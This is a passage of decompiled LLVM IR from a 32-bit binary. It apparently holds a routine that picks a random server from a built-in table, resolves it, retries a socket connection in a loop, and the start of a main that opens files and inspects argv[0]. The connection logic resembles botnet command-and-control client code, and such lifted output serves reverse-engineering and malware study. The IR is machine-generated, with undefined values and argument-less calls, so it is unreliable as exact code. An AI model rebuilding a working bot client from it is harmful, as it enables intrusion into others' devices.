  %v0_804939f.pre19 = phi i32 [ %v15_8049355, %entry ], [ %storemerge21.in, %dec_label_pc_8049358.backedge ]
  %stack_var_-8.0 = phi i32 [ %tmp25, %entry ], [ %stack_var_-8.0.be, %dec_label_pc_8049358.backedge ]
  %stack_var_-40.0.off0 = phi i32 [ %extract.t3, %entry ], [ %stack_var_-40.1.off0, %dec_label_pc_8049358.backedge ]
  store i32 -1, i32* @global_var_8056f38.296, align 8
  store i32 1, i32* %stack_var_-36, align 4
  %v0_8049369 = load i32, i32* @global_var_8056560.297, align 32
  store i32 %v0_8049369, i32* %eax.global-to-local, align 4
  %v1_804936e = icmp eq i32 %v0_8049369, 0
  %v1_8049370 = icmp eq i1 %v1_804936e, false
  br i1 %v1_8049370, label %dec_label_pc_8049395, label %dec_label_pc_8049372

dec_label_pc_8049372:                             ; preds = %dec_label_pc_8049358
  %v1_8049372 = call i32 @rand(i32 1)
  %v0_8049379 = load i64, i64* @global_var_8056498.298, align 8
  %v1_8049379 = trunc i64 %v0_8049379 to i32
  %v1_8049383 = ashr i32 %v1_8049372, 31
  %v6_8049384 = zext i32 %v1_8049372 to i64
  %v8_8049384 = zext i32 %v1_8049383 to i64
  %v9_8049384 = mul nuw i64 %v8_8049384, 4294967296
  %v10_8049384 = or i64 %v9_8049384, %v6_8049384
  %v14_8049384 = srem i64 %v10_8049384, %v0_8049379
  %v15_8049384 = trunc i64 %v14_8049384 to i32
  store i32 %v15_8049384, i32* %edx.global-to-local, align 4
  store i32 %v15_8049384, i32* %eax.global-to-local, align 4
  %v1_8049389 = mul i32 %v15_8049384, 4
  %v2_8049389 = add i32 %v1_8049389, ptrtoint ([22 x i8]** @global_var_805649c.300 to i32)
  %v3_8049389 = inttoptr i32 %v2_8049389 to i32*
  %v4_8049389 = load i32, i32* %v3_8049389, align 4
  store i32 %v4_8049389, i32* %eax.global-to-local, align 4
  store i32 %v4_8049389, i32* @global_var_8056f40.301, align 64
  %v0_804939f.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049395

dec_label_pc_8049395:                             ; preds = %dec_label_pc_8049358, %dec_label_pc_8049372
  %v0_804939f.pre = phi i32 [ %v0_804939f.pre19, %dec_label_pc_8049358 ], [ %v0_804939f.pre.pre, %dec_label_pc_8049372 ]
  %stack_var_-40.1.off0 = phi i32 [ %stack_var_-40.0.off0, %dec_label_pc_8049358 ], [ %v1_8049379, %dec_label_pc_8049372 ]
  store i32 0, i32* @global_var_8056560.297, align 32
  br label %dec_label_pc_804939f

dec_label_pc_804939f:                             ; preds = %dec_label_pc_804939f, %dec_label_pc_8049395
  %v0_804939f = phi i32 [ %v1_80493ad, %dec_label_pc_804939f ], [ %v0_804939f.pre, %dec_label_pc_8049395 ]
  %v1_80493a2 = add i32 %v0_804939f, -8
  %v2_80493a2 = inttoptr i32 %v1_80493a2 to i32*
  store i32 6, i32* %v2_80493a2, align 4
  %v1_80493a4 = add i32 %v0_804939f, -12
  %v2_80493a4 = inttoptr i32 %v1_80493a4 to i32*
  store i32 1, i32* %v2_80493a4, align 4
  %v1_80493a6 = add i32 %v0_804939f, -16
  %v2_80493a6 = inttoptr i32 %v1_80493a6 to i32*
  store i32 2, i32* %v2_80493a6, align 4
  %v2_80493a8 = load i32, i32* %stack_var_-36, align 4
  %v3_80493a8 = load i32, i32* %stack_var_-32, align 4
  %v4_80493a8 = call i32 @socket(i32 %stack_var_-40.1.off0, i32 %v2_80493a8, i32 %v3_80493a8)
  %v0_80493ad = load i32, i32* @esp, align 4
  %v1_80493ad = add i32 %v0_80493ad, 16
  store i32 %v4_80493a8, i32* @global_var_8056f38.296, align 8
  store i32 %v4_80493a8, i32* %eax.global-to-local, align 4
  %v2_80493ba = icmp slt i32 %v4_80493a8, 0
  br i1 %v2_80493ba, label %dec_label_pc_804939f, label %dec_label_pc_80493be

dec_label_pc_80493be:                             ; preds = %dec_label_pc_804939f
  %v0_80493be = load i32, i32* @global_var_8056f40.301, align 64
  store i32 %v0_80493be, i32* %eax.global-to-local, align 4
  %v3_80493c6 = inttoptr i32 %v0_80493ad to i32*
  store i32 %v0_80493be, i32* %v3_80493c6, align 4
  %v2_80493c7 = call i32 @inet_addr(i32 %stack_var_-40.1.off0)
  store i32 %v2_80493c7, i32* %eax.global-to-local, align 4
  %v0_80493cc = load i32, i32* @esp, align 4
  %v1_80493cf = icmp eq i32 %v2_80493c7, 0
  br i1 %v1_80493cf, label %dec_label_pc_80493e9, label %dec_label_pc_80493d3

dec_label_pc_80493d3:                             ; preds = %dec_label_pc_80493be
  %v0_80493d3 = load i32, i32* @global_var_8056f40.301, align 64
  store i32 %v0_80493d3, i32* %eax.global-to-local, align 4
  %v3_80493db = inttoptr i32 %v0_80493cc to i32*
  store i32 %v0_80493d3, i32* %v3_80493db, align 4
  %v2_80493dc = call i32 @inet_addr(i32 %stack_var_-40.1.off0)
  store i32 %v2_80493dc, i32* %eax.global-to-local, align 4
  %v0_80493e1 = load i32, i32* @esp, align 4
  %v10_80493e4 = icmp eq i32 %v2_80493dc, -1
  %v1_80493e7 = icmp eq i1 %v10_80493e4, false
  br i1 %v1_80493e7, label %dec_label_pc_8049449, label %dec_label_pc_80493e9

dec_label_pc_80493e9:                             ; preds = %dec_label_pc_80493d3, %dec_label_pc_80493be
  %v0_80493ee.in = phi i32 [ %v0_80493e1, %dec_label_pc_80493d3 ], [ %v0_80493cc, %dec_label_pc_80493be ]
  %v0_80493e9 = load i32, i32* @global_var_8056f40.301, align 64
  store i32 %v0_80493e9, i32* @eax, align 4
  %v3_80493f1 = inttoptr i32 %v0_80493ee.in to i32*
  store i32 %v0_80493e9, i32* %v3_80493f1, align 4
  %v2_80493f2 = call i32 @gethostbyname(i32 %stack_var_-40.1.off0)
  store i32 %v2_80493f2, i32* %eax.global-to-local, align 4
  %v0_80493f7 = load i32, i32* @esp, align 4
  %v4_80493fd = icmp eq i32 %v2_80493f2, 0
  %v1_8049401 = icmp eq i1 %v4_80493fd, false
  br i1 %v1_8049401, label %dec_label_pc_8049423, label %dec_label_pc_8049403

dec_label_pc_8049403:                             ; preds = %dec_label_pc_80493e9
  store i32 0, i32* @global_var_8056f40.301, align 64
  %v0_804940d = load i32, i32* @global_var_8056f38.296, align 8
  store i32 %v0_804940d, i32* %eax.global-to-local, align 4
  %v3_8049415 = inttoptr i32 %v0_80493f7 to i32*
  store i32 %v0_804940d, i32* %v3_8049415, align 4
  %v1_8049416 = call i32 @close(i32 %v2_80493f2)
  br label %dec_label_pc_8049358.backedge

dec_label_pc_8049358.backedge:                    ; preds = %dec_label_pc_8049403, %dec_label_pc_8049565
  %storemerge = phi i32 [ %v1_8049416, %dec_label_pc_8049403 ], [ %v1_8049578, %dec_label_pc_8049565 ]
  %stack_var_-8.0.be = phi i32 [ %v2_80493f2, %dec_label_pc_8049403 ], [ %stack_var_-8.1, %dec_label_pc_8049565 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %storemerge21.in.in = load i32, i32* @esp, align 4
  %storemerge21.in = add i32 %storemerge21.in.in, 16
  br label %dec_label_pc_8049358

dec_label_pc_8049423:                             ; preds = %dec_label_pc_80493e9
  store i32 %v2_80493f2, i32* %eax.global-to-local, align 4
  %v1_8049426 = add i32 %v2_80493f2, 12
  %v2_8049426 = inttoptr i32 %v1_8049426 to i32*
  %v3_8049426 = load i32, i32* %v2_8049426, align 4
  store i32 %v3_8049426, i32* %edx.global-to-local, align 4
  store i32 %v2_80493f2, i32* %eax.global-to-local, align 4
  %v1_804942e = add i32 %v2_80493f2, 16
  %v2_804942e = inttoptr i32 %v1_804942e to i32*
  %v3_804942e = load i32, i32* %v2_804942e, align 4
  store i32 %v3_804942e, i32* %eax.global-to-local, align 4
  %v1_8049431 = inttoptr i32 %v3_804942e to i32*
  %v2_8049431 = load i32, i32* %v1_8049431, align 4
  store i32 %v2_8049431, i32* %ecx.global-to-local, align 4
  %v2_8049436 = add i32 %v0_80493f7, 8
  %v3_8049436 = inttoptr i32 %v2_8049436 to i32*
  store i32 %v3_8049426, i32* %v3_8049436, align 4
  store i32 %v15_804943a, i32* %eax.global-to-local, align 4
  %v2_804943d = add i32 %v0_80493f7, 4
  %v3_804943d = inttoptr i32 %v2_804943d to i32*
  store i32 %v15_804943a, i32* %v3_804943d, align 4
  %v0_804943e = load i32, i32* %ecx.global-to-local, align 4
  %v3_804943e = inttoptr i32 %v0_80493f7 to i32*
  store i32 %v0_804943e, i32* %v3_804943e, align 4
  %v1_804943f = load i32, i32* %stack_var_-4, align 4
  %v2_804943f = load i32, i32* %stack_var_0, align 4
  %v3_804943f = call i32 @bcopy(i32 %v2_80493f2, i32 %v1_804943f, i32 %v2_804943f)
  store i32 %v3_804943f, i32* %eax.global-to-local, align 4
  %v0_8049444 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804945d

dec_label_pc_8049449:                             ; preds = %dec_label_pc_80493d3
  %v0_8049449 = load i32, i32* @global_var_8056f40.301, align 64
  store i32 %v0_8049449, i32* %eax.global-to-local, align 4
  %v3_8049451 = inttoptr i32 %v0_80493e1 to i32*
  store i32 %v0_8049449, i32* %v3_8049451, align 4
  %v1_8049452 = call i32 @inet_addr(i32 %stack_var_-8.0)
  store i32 %v1_8049452, i32* %eax.global-to-local, align 4
  %v0_8049457 = load i32, i32* @esp, align 4
  store i32 %v1_8049452, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804945d

dec_label_pc_804945d:                             ; preds = %dec_label_pc_8049423, %dec_label_pc_8049449
  %v0_8049463.in = phi i32 [ %v0_8049444, %dec_label_pc_8049423 ], [ %v0_8049457, %dec_label_pc_8049449 ]
  %stack_var_-8.1 = phi i32 [ %v2_80493f2, %dec_label_pc_8049423 ], [ %stack_var_-8.0, %dec_label_pc_8049449 ]
  store i32 2, i32* %stack_var_-32, align 4
  %v2_8049466 = inttoptr i32 %v0_8049463.in to i32*
  store i32 23333, i32* %v2_8049466, align 4
  %v0_804946b = load i32, i32* %stack_var_-32, align 4
  %v1_804946b = trunc i32 %v0_804946b to i16
  %v2_804946b = call i32 @htons(i16 %v1_804946b)
  %v0_8049470 = load i32, i32* @esp, align 4
  %v0_8049477 = load i32, i32* @global_var_8056f38.296, align 8
  store i32 %v0_8049477, i32* %edx.global-to-local, align 4
  store i32 %v2_8049480, i32* %eax.global-to-local, align 4
  %v2_8049483 = add i32 %v0_8049470, 8
  %v3_8049483 = inttoptr i32 %v2_8049483 to i32*
  store i32 %v2_8049480, i32* %v3_8049483, align 4
  %v1_8049484 = add i32 %v0_8049470, 4
  %v2_8049484 = inttoptr i32 %v1_8049484 to i32*
  store i32 21537, i32* %v2_8049484, align 4
  %v0_8049489 = load i32, i32* %edx.global-to-local, align 4
  %v3_8049489 = inttoptr i32 %v0_8049470 to i32*
  store i32 %v0_8049489, i32* %v3_8049489, align 4
  %sext = mul i32 %v2_804946b, 65536
  %v1_804948a = sdiv i32 %sext, 65536
  %v4_804948a = call i32 @ioctl(i32 %v1_804948a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804948a, i32* %eax.global-to-local, align 4
  %v0_804948f = load i32, i32* @esp, align 4
  %v2_8049495 = inttoptr i32 %v0_804948f to i32*
  store i32 0, i32* %v2_8049495, align 4
  %v2_8049497 = inttoptr i32 %v1_804948a to i32*
  %v3_8049497 = call i32 @time(i32* %v2_8049497)
  store i32 %v3_8049497, i32* %eax.global-to-local, align 4
  %v1_8049551 = inttoptr i32 %v3_8049497 to i32*
  br label %dec_label_pc_804954c

dec_label_pc_80494a7:                             ; preds = %dec_label_pc_804954c
  %v1_80494a7 = call i32 @__errno_location(i32 %v3_8049497)
  %v1_80494ac = inttoptr i32 %v1_80494a7 to i32*
  store i32 0, i32* %v1_80494ac, align 4
  store i32 %v2_8049437, i32* %eax.global-to-local, align 4
  %v0_80494b5 = load i32, i32* @global_var_8056f38.296, align 8
  store i32 %v0_80494b5, i32* %edx.global-to-local, align 4
  %v0_80494bb = load i32, i32* @esp, align 4
  %v1_80494be = add i32 %v0_80494bb, -8
  %v2_80494be = inttoptr i32 %v1_80494be to i32*
  store i32 16, i32* %v2_80494be, align 4
  %v2_80494c0 = add i32 %v0_80494bb, -12
  %v3_80494c0 = inttoptr i32 %v2_80494c0 to i32*
  store i32 %v2_8049437, i32* %v3_80494c0, align 4
  %v0_80494c1 = load i32, i32* %edx.global-to-local, align 4
  %v2_80494c1 = add i32 %v0_80494bb, -16
  %v3_80494c1 = inttoptr i32 %v2_80494c1 to i32*
  store i32 %v0_80494c1, i32* %v3_80494c1, align 4
  %v2_80494c2 = load i32, i32* %stack_var_-4, align 4
  %v3_80494c2 = call i32 @connect(i32 %v3_8049497, i32 %stack_var_-8.1, i32 %v2_80494c2)
  store i32 %v3_80494c2, i32* %eax.global-to-local, align 4
  %v0_80494c7 = load i32, i32* @esp, align 4
  %v1_80494c7 = add i32 %v0_80494c7, 16
  %v1_80494ca = icmp eq i32 %v3_80494c2, 0
  br i1 %v1_80494ca, label %dec_label_pc_80494da, label %dec_label_pc_80494ce

dec_label_pc_80494ce:                             ; preds = %dec_label_pc_80494a7
  %v1_80494ce = call i32 @__errno_location(i32 %v3_8049497)
  store i32 %v1_80494ce, i32* %eax.global-to-local, align 4
  %v1_80494d3 = inttoptr i32 %v1_80494ce to i32*
  %v2_80494d3 = load i32, i32* %v1_80494d3, align 4
  store i32 %v2_80494d3, i32* %eax.global-to-local, align 4
  %v9_80494d5 = icmp eq i32 %v2_80494d3, 106
  %v1_80494d8 = icmp eq i1 %v9_80494d5, false
  br i1 %v1_80494d8, label %dec_label_pc_8049527, label %dec_label_pc_80494ce.dec_label_pc_80494da_crit_edge

dec_label_pc_80494ce.dec_label_pc_80494da_crit_edge: ; preds = %dec_label_pc_80494ce
  %v0_80494df.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80494da

dec_label_pc_80494da:                             ; preds = %dec_label_pc_80494a7, %dec_label_pc_80494ce.dec_label_pc_80494da_crit_edge
  %v0_80494df = phi i32 [ %v0_80494df.pre, %dec_label_pc_80494ce.dec_label_pc_80494da_crit_edge ], [ %v1_80494c7, %dec_label_pc_80494a7 ]
  %v0_80494da = load i32, i32* @global_var_8056f38.296, align 8
  store i32 %v0_80494da, i32* %eax.global-to-local, align 4
  %v1_80494e2 = add i32 %v0_80494df, -16
  %v2_80494e2 = inttoptr i32 %v1_80494e2 to i32*
  store i32 0, i32* %v2_80494e2, align 4
  %v1_80494e4 = add i32 %v0_80494df, -20
  %v2_80494e4 = inttoptr i32 %v1_80494e4 to i32*
  store i32 0, i32* %v2_80494e4, align 4
  %v1_80494e6 = add i32 %v0_80494df, -24
  %v2_80494e6 = inttoptr i32 %v1_80494e6 to i32*
  store i32 13, i32* %v2_80494e6, align 4
  %v1_80494e8 = add i32 %v0_80494df, -28
  %v2_80494e8 = inttoptr i32 %v1_80494e8 to i32*
  store i32 1, i32* %v2_80494e8, align 4
  %v0_80494ea = load i32, i32* %eax.global-to-local, align 4
  %v2_80494ea = add i32 %v0_80494df, -32
  %v3_80494ea = inttoptr i32 %v2_80494ea to i32*
  store i32 %v0_80494ea, i32* %v3_80494ea, align 4
  %v0_80494eb = call i32 @setsockopt()
  %v0_80494f0 = load i32, i32* @esp, align 4
  %v0_80494f3 = load i32, i32* @global_var_8056f38.296, align 8
  store i32 %v0_80494f3, i32* %eax.global-to-local, align 4
  %v1_80494fb = add i32 %v0_80494f0, 16
  %v2_80494fb = inttoptr i32 %v1_80494fb to i32*
  store i32 0, i32* %v2_80494fb, align 4
  %v1_80494fd = add i32 %v0_80494f0, 12
  %v2_80494fd = inttoptr i32 %v1_80494fd to i32*
  store i32 0, i32* %v2_80494fd, align 4
  %v1_80494ff = add i32 %v0_80494f0, 8
  %v2_80494ff = inttoptr i32 %v1_80494ff to i32*
  store i32 2, i32* %v2_80494ff, align 4
  %v1_8049501 = add i32 %v0_80494f0, 4
  %v2_8049501 = inttoptr i32 %v1_8049501 to i32*
  store i32 1, i32* %v2_8049501, align 4
  %v0_8049503 = load i32, i32* %eax.global-to-local, align 4
  %v3_8049503 = inttoptr i32 %v0_80494f0 to i32*
  store i32 %v0_8049503, i32* %v3_8049503, align 4
  %v0_8049504 = call i32 @setsockopt()
  %v0_8049509 = load i32, i32* @esp, align 4
  %v0_804950c = load i32, i32* @global_var_8056f38.296, align 8
  store i32 %v0_804950c, i32* %eax.global-to-local, align 4
  %v1_8049514 = add i32 %v0_8049509, 16
  %v2_8049514 = inttoptr i32 %v1_8049514 to i32*
  store i32 0, i32* %v2_8049514, align 4
  %v1_8049516 = add i32 %v0_8049509, 12
  %v2_8049516 = inttoptr i32 %v1_8049516 to i32*
  store i32 0, i32* %v2_8049516, align 4
  %v1_8049518 = add i32 %v0_8049509, 8
  %v2_8049518 = inttoptr i32 %v1_8049518 to i32*
  store i32 9, i32* %v2_8049518, align 4
  %v1_804951a = add i32 %v0_8049509, 4
  %v2_804951a = inttoptr i32 %v1_804951a to i32*
  store i32 1, i32* %v2_804951a, align 4
  %v0_804951c = load i32, i32* %eax.global-to-local, align 4
  %v3_804951c = inttoptr i32 %v0_8049509 to i32*
  store i32 %v0_804951c, i32* %v3_804951c, align 4
  %v0_804951d = call i32 @setsockopt()
  store i32 %v0_804951d, i32* %eax.global-to-local, align 4
  %v2_8049585 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049585, i32* @ebp, align 4
  ret i32 %v0_804951d

dec_label_pc_8049527:                             ; preds = %dec_label_pc_80494ce
  %v1_8049527 = call i32 @__errno_location(i32 %v3_8049497)
  store i32 %v1_8049527, i32* %eax.global-to-local, align 4
  %v1_804952c = inttoptr i32 %v1_8049527 to i32*
  %v2_804952c = load i32, i32* %v1_804952c, align 4
  store i32 %v2_804952c, i32* %eax.global-to-local, align 4
  %v9_804952e = icmp eq i32 %v2_804952c, 115
  br i1 %v9_804952e, label %dec_label_pc_804953f, label %dec_label_pc_8049533

dec_label_pc_8049533:                             ; preds = %dec_label_pc_8049527
  %v1_8049533 = call i32 @__errno_location(i32 %v3_8049497)
  store i32 %v1_8049533, i32* %eax.global-to-local, align 4
  %v1_8049538 = inttoptr i32 %v1_8049533 to i32*
  %v2_8049538 = load i32, i32* %v1_8049538, align 4
  store i32 %v2_8049538, i32* %eax.global-to-local, align 4
  %v9_804953a = icmp eq i32 %v2_8049538, 114
  %v1_804953d = icmp eq i1 %v9_804953a, false
  br i1 %v1_804953d, label %dec_label_pc_8049533.dec_label_pc_8049565_crit_edge, label %dec_label_pc_804953f

dec_label_pc_8049533.dec_label_pc_8049565_crit_edge: ; preds = %dec_label_pc_8049533
  %v0_8049574.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049565

dec_label_pc_804953f:                             ; preds = %dec_label_pc_8049533, %dec_label_pc_8049527
  %v0_804953f = load i32, i32* @esp, align 4
  %v1_8049542 = add i32 %v0_804953f, -16
  %v2_8049542 = inttoptr i32 %v1_8049542 to i32*
  store i32 1, i32* %v2_8049542, align 4
  %v1_8049544 = call i32 @sleep(i32 %v3_8049497)
  store i32 %v1_8049544, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804954c

dec_label_pc_804954c:                             ; preds = %dec_label_pc_804945d, %dec_label_pc_804953f
  %storemerge9.in.in = load i32, i32* @esp, align 4
  %v2_804954f = inttoptr i32 %storemerge9.in.in to i32*
  store i32 0, i32* %v2_804954f, align 4
  %v2_8049551 = call i32 @time(i32* %v1_8049551)
  %v0_8049556 = load i32, i32* @esp, align 4
  %v1_8049556 = add i32 %v0_8049556, 16
  %v5_8049559 = sub i32 %v2_8049551, %v3_8049497
  store i32 %v5_8049559, i32* %eax.global-to-local, align 4
  %tmp = icmp ult i32 %v5_8049559, 10
  br i1 %tmp, label %dec_label_pc_80494a7, label %dec_label_pc_8049565

dec_label_pc_8049565:                             ; preds = %dec_label_pc_804954c, %dec_label_pc_8049533.dec_label_pc_8049565_crit_edge
  %v0_8049574 = phi i32 [ %v0_8049574.pre, %dec_label_pc_8049533.dec_label_pc_8049565_crit_edge ], [ %v1_8049556, %dec_label_pc_804954c ]
  store i32 0, i32* @global_var_8056f40.301, align 64
  %v0_804956f = load i32, i32* @global_var_8056f38.296, align 8
  store i32 %v0_804956f, i32* %eax.global-to-local, align 4
  %v2_8049577 = add i32 %v0_8049574, -16
  %v3_8049577 = inttoptr i32 %v2_8049577 to i32*
  store i32 %v0_804956f, i32* %v3_8049577, align 4
  %v1_8049578 = call i32 @close(i32 %v3_8049497)
  br label %dec_label_pc_8049358.backedge

; uselistorder directives
  uselistorder i32 %v0_80494df, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v3_8049497, { 0, 7, 2, 1, 3, 4, 5, 6, 8, 9 }
  uselistorder i32 %v1_804948a, { 1, 0 }
  uselistorder i32 %stack_var_-8.1, { 1, 0 }
  uselistorder i32 %v0_80493f7, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80493f2, { 2, 3, 5, 4, 7, 6, 0, 1, 8, 9 }
  uselistorder i32 %v0_80493e1, { 1, 0 }
  uselistorder i32 %v4_80493a8, { 2, 1, 0 }
  uselistorder i32 %v0_804939f, { 2, 1, 0 }
  uselistorder i32 %stack_var_-40.1.off0, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v2_8049437, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 2, 1, 0, 4, 3 }
  uselistorder i32* %stack_var_-32, { 1, 2, 0, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 18, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 21537, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 2, 1, 0 }
  uselistorder i32 (i32)* @gethostbyname, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @rand, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804954c, { 1, 0 }
  uselistorder label %dec_label_pc_80494da, { 1, 0 }
  uselistorder label %dec_label_pc_804945d, { 1, 0 }
  uselistorder label %dec_label_pc_8049358.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8049395, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i8*, align 4
  %stack_var_-20 = alloca i8*, align 4
  %tmp73 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2704 = alloca i32, align 4
  %stack_var_-6800 = alloca i32, align 4
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-390 = alloca i32, align 4
  %stack_var_-1680 = alloca i32, align 4
  %stack_var_-656 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-6832 = alloca i8*, align 4
  %stack_var_-6828 = alloca i8*, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_8049587 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8049587, i32* %ecx.global-to-local, align 4
  %v0_8049594 = load i32, i32* @ebx, align 4
  store i32 %v2_8049587, i32* %edx.global-to-local, align 4
  %v1_80495a8 = add i32 %v2_8049587, 4
  %v2_80495a8 = inttoptr i32 %v1_80495a8 to i32*
  %v3_80495a8 = load i32, i32* %v2_80495a8, align 4
  store i32 %v3_80495a8, i32* %eax.global-to-local, align 4
  %v1_80495ab = inttoptr i32 %v3_80495a8 to i32*
  %v2_80495ab = load i32, i32* %v1_80495ab, align 4
  store i32 %v2_80495ab, i32* %eax.global-to-local, align 4
  store i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8054306.270, i32 0, i32 0), i8** %stack_var_-6828, align 4
  %tmp108 = bitcast i8** %stack_var_-6832 to i32*
  store i32 ptrtoint ([19 x i8]* @global_var_805440c.302 to i32), i32* %tmp108, align 4
  %v5_80495c2 = call i32 @fopen(i32 ptrtoint ([19 x i8]* @global_var_805440c.302 to i32), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8054306.270, i32 0, i32 0))
  store i32 %v5_80495c2, i32* @eax, align 4
  %v4_80495cd = icmp eq i32 %v5_80495c2, 0
  %v1_80495d1 = icmp eq i1 %v4_80495cd, false
  br i1 %v1_80495d1, label %dec_label_pc_80495f0, label %dec_label_pc_80495d3

dec_label_pc_80495d3:                             ; preds = %entry
  store i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8054306.270, i32 0, i32 0), i8** %stack_var_-6828, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_805441f.303 to i32), i32* %tmp108, align 4
  %v5_80495e5 = call i32 @fopen(i32 ptrtoint ([13 x i8]* @global_var_805441f.303 to i32), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8054306.270, i32 0, i32 0))
  store i32 %v5_80495e5, i32* @eax, align 4
  br label %dec_label_pc_80495f0

dec_label_pc_80495f0:                             ; preds = %entry, %dec_label_pc_80495d3
  %stack_var_-72.0 = phi i32 [ %v5_80495c2, %entry ], [ %v5_80495e5, %dec_label_pc_80495d3 ]
  %v3_80497049 = phi i32 [ ptrtoint ([19 x i8]* @global_var_805440c.302 to i32), %entry ], [ ptrtoint ([13 x i8]* @global_var_805441f.303 to i32), %dec_label_pc_80495d3 ]
  %v4_80495f0 = icmp eq i32 %stack_var_-72.0, 0
  br i1 %v4_80495f0, label %dec_label_pc_804975b, label %dec_label_pc_80495fa

dec_label_pc_80495fa:                             ; preds = %dec_label_pc_80495f0
  store i32 %v2_8049587, i32* %ecx.global-to-local, align 4
  %v3_8049600 = load i32, i32* %v2_80495a8, align 4
  store i32 %v3_8049600, i32* %eax.global-to-local, align 4
  %v1_8049603 = inttoptr i32 %v3_8049600 to i32*
  %v2_8049603 = load i32, i32* %v1_8049603, align 4
  store i32 %v2_8049603, i32* %eax.global-to-local, align 4
  %v5_8049608 = inttoptr i32 %v2_8049603 to i8*
  store i8* %v5_8049608, i8** %stack_var_-6832, align 4
  %v3_8049609 = call i32 @strlen(i8* %v5_8049608)
  %v2_8049623 = ptrtoint i32* %stack_var_-340 to i32
  store i32 %v2_8049623, i32* %eax.global-to-local, align 4
  %tmp109 = bitcast i32* %stack_var_-340 to i8*
  store i8* %tmp109, i8** %stack_var_-6832, align 4
  %v4_804962a = call i32 @getcwd(i32 %v2_8049623, i32 256)
  store i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_805442c.304, i32 0, i32 0), i8** %stack_var_-6828, align 4
  store i32 %v2_8049623, i32* %eax.global-to-local, align 4
  store i8* %tmp109, i8** %stack_var_-6832, align 4
  %v6_8049641 = call i32 @strcmp(i8* %tmp109, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_805442c.304, i32 0, i32 0))
  store i32 %v6_8049641, i32* %eax.global-to-local, align 4
  %v1_8049649 = icmp eq i32 %v6_8049641, 0
  br i1 %v1_8049649, label %dec_label_pc_804974d, label %dec_label_pc_8049656

dec_label_pc_8049653:                             ; preds = %dec_label_pc_8049656
  %v4_8049653 = add i32 %stack_var_-56.0, -1
  br label %dec_label_pc_8049656

dec_label_pc_8049656:                             ; preds = %dec_label_pc_80495fa, %dec_label_pc_8049653
  %stack_var_-56.0 = phi i32 [ %v4_8049653, %dec_label_pc_8049653 ], [ %v3_8049609, %dec_label_pc_80495fa ]
  store i32 %v2_8049587, i32* %edx.global-to-local, align 4
  %v3_804965c = load i32, i32* %v2_80495a8, align 4
  store i32 %v3_804965c, i32* %eax.global-to-local, align 4
  %v1_804965f = inttoptr i32 %v3_804965c to i32*
  %v2_804965f = load i32, i32* %v1_804965f, align 4
  store i32 %v2_804965f, i32* %edx.global-to-local, align 4
  %v2_8049664 = add i32 %v2_804965f, %stack_var_-56.0
  store i32 %v2_8049664, i32* %eax.global-to-local, align 4
  %v1_8049667 = inttoptr i32 %v2_8049664 to i8*
  %v2_8049667 = load i8, i8* %v1_8049667, align 1
  %v3_8049667 = zext i8 %v2_8049667 to i32
  %v5_8049667 = and i32 %v2_8049664, -256
  %v6_8049667 = or i32 %v3_8049667, %v5_8049667
  store i32 %v6_8049667, i32* %eax.global-to-local, align 4
  %v10_8049669 = icmp eq i8 %v2_8049667, 47
  %v1_804966b = icmp eq i1 %v10_8049669, false
  br i1 %v1_804966b, label %dec_label_pc_8049653, label %dec_label_pc_804966d

dec_label_pc_804966d:                             ; preds = %dec_label_pc_8049656
  store i32 %v2_8049587, i32* %ecx.global-to-local, align 4
  %v3_8049673 = load i32, i32* %v2_80495a8, align 4
  store i32 %v3_8049673, i32* %eax.global-to-local, align 4
  %v1_8049676 = inttoptr i32 %v3_8049673 to i32*
  %v2_8049676 = load i32, i32* %v1_8049676, align 4
  store i32 %v2_8049676, i32* @edx, align 4
  %v2_804967b = add i32 %v2_8049676, %stack_var_-56.0
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805442e.305, i32 0, i32 0), i8** %stack_var_-6828, align 4
  %v2_804968b = ptrtoint i32* %stack_var_-656 to i32
  store i32 %v2_804968b, i32* %eax.global-to-local, align 4
  %tmp110 = bitcast i32* %stack_var_-656 to i8*
  store i8* %tmp110, i8** %stack_var_-6832, align 4
  %v6_8049692 = call i32 @sprintf(i32 %v2_804968b, i32 ptrtoint ([8 x i8]* @global_var_805442e.305 to i32), i32 %v2_8049623, i32 %v2_804967b)
